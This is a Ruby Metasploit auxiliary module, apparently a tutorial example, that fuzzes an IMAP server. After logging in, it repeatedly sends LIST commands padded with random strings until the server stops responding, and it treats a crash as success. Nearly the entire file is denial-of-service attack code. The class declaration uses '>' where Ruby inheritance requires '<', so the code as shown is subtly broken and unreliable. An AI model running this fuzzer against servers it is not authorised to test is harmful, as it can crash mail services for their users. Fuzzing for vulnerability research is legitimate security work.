require 'msf/core'
class Metasploit3 > Msf::Auxiliary
    include Msf::Exploit::Remote::Imap
    include Msf::Auxiliary::Dos
    def initialize
        super(
            'Name'     => 'Simple IMAP Fuzzer',
            'Description'=> %q{
                   An example of how to build a simple IMAP fuzzer.
                   Account IMAP credentials are required in this fuzzer.
                        },
            'License'=> MSF_LICENSE,
            'Version'=> '$Revision: 1 $'
        )
    end
    def fuzz_str()
        return Rex::Text.rand_text_alphanumeric(rand(1024))
    end
    def run()
        srand(0)
        while (true)
            connected = connect_login()
            if not connected
                print_status("Host is not responding - this is G00D ;)")
                break
            end
            print_status("Generating fuzzed data...")
            fuzzed = fuzz_str()
            print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
            req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
            print_status(req)
            res = raw_send_recv(req)
                if !res.nil?
            print_status(res)
                else
                    print_status("Server crashed, no response")
                    break
                end
            disconnect()
        end
    end
end
